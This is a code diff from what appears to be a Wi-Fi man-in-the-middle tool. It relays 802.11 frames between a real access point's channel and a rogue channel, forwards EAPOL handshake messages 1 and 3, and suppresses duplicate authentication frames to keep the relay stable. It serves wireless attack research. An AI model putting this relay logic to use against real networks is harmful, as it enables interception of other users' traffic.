@@ -11,6 +11,14 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
+void McMitm::send_to_real(PDU &pdu) const {
+	sock_real->send(pdu, netconfig.real_channel);
+}
+
+void McMitm::send_to_real(const vector<uint8_t> &raw) const{
+	sock_real->send(raw, netconfig.real_channel);
+}
+
 bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
 	if(dot11.find_pdu<Dot11ProbeRequest>()){
 		probe_resp->addr1(addr2);
@@ -78,15 +86,15 @@ bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const vecto
 	return false;
 }
 
-bool McMitm::handle_eapol_real(const HWAddress<6> addr2, PDU &pdu) const{
-	if(addr2 == ap.get(SK::mac)){
-		// EAPOL od AP -> forward na rogue channel
-		if(is_eapol(pdu)){
-			int eapol_msg = get_eapol_msg_num(pdu);
-			log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
-			if(eapol_msg == 1 || eapol_msg == 3) send_to_rogue(pdu);
-			return true;
+bool McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const{
+	// EAPOL AP -> STA on real channel
+	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)){
+		int eapol_msg = get_eapol_msg_num(pdu);
+		if(eapol_msg == 1 || eapol_msg == 3) {
+			log(LogLevel::INFO, "Real channel: EAPOL {} AP -> STA", eapol_msg);
+			send_to_rogue(pdu);
 		}
+		return true;
 	}
 	return false;
 }
@@ -100,7 +108,8 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
 		return;
 	}
 
-	const bool might_forward = client_state.get_mac() == addr1 && client_state.should_forward(*pdu);
+	// AP -> client ?
+	const bool might_forward = client_state.get_mac() == addr1 /*&& client_state.should_forward(*pdu)*/;
 
 	//print
 	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
@@ -111,6 +120,13 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
 
 	// Forward na rogue channel
 	if(might_forward){
+		// Auth(seq=2) from real AP must NOT be forwarded — rogue side already sent a synthetic
+		// Auth(seq=2) in handle_open_auth. Forwarding it triggers a second assoc cycle at the
+		// real AP ("Multiple EAP reauth attempts without 4-way handshake completion").
+		if(const auto *auth = dot11.find_pdu<Dot11Authentication>(); auth && auth->auth_seq_number() == 2){
+			log(LogLevel::DEBUG, "Real channel: dropping Auth(seq=2) relay to rogue (synthetic already sent)");
+			return;
+		}
 		client_state.modify_packet(*pdu);
 		send_to_rogue(*pdu);
 	}
@@ -134,22 +150,17 @@ void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
 	}
 }
 
-void McMitm::send_to_real(PDU &pdu) const{ sock_real->send(pdu, netconfig.real_channel); }
-
-void McMitm::send_to_real(const vector<uint8_t> &raw) const{
-	sock_real->send(raw, netconfig.real_channel);
-}
-
-//void McMitm::send_to_real(const vector<uint8_t> &raw) const { sock_real->send(, netconfig.real_channel); }
-void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }
-
-void McMitm::send_to_rogue(const vector<uint8_t> &raw) const{
-	sock_rogue->send(raw, netconfig.rogue_channel);
-}
-
 void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
+
+	//filter out different channels
+	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
+		if(rt->present() & RadioTap::CHANNEL &&
+			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
+			return;
+	}
+
 	const auto [addr1, addr2] = get_addrs(*pdu, raw);
 	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
 		log(LogLevel::DEBUG, "Unknown frame type");
@@ -160,10 +171,10 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 
 	if(handle_probe_real(addr2, *dot11)) return;
 	//TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
-	if(handle_eapol_real(addr1, *dot11)) return;
+	if(handle_eapol_real(addr1, addr2, *dot11)) return;
 	if(handle_auth_from_client_real(addr1, *dot11)) return;
 
-	if(dot11->addr1() == ap.get(SK::mac)){
+	if(dot11->addr1() == ap.get(SK::mac)){ // receiver is AP
 		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
 		// STA -> AP
 		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
@@ -171,7 +182,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 	} else if(addr2 == ap.get(SK::mac)){ // AP -> STA
 		//TODO FIXME refactirion
 		handle_from_ap_real(pdu, *dot11, addr1);
-	} else if(client_state.get_mac() == dot11->addr1() || client_state.get_mac() == addr2){
+	} else if( dot11->addr1() == client_state.get_mac() || client_state.get_mac() == addr2){
 		display_traffic(*dot11, "Real channel", "_");
 	}
 }
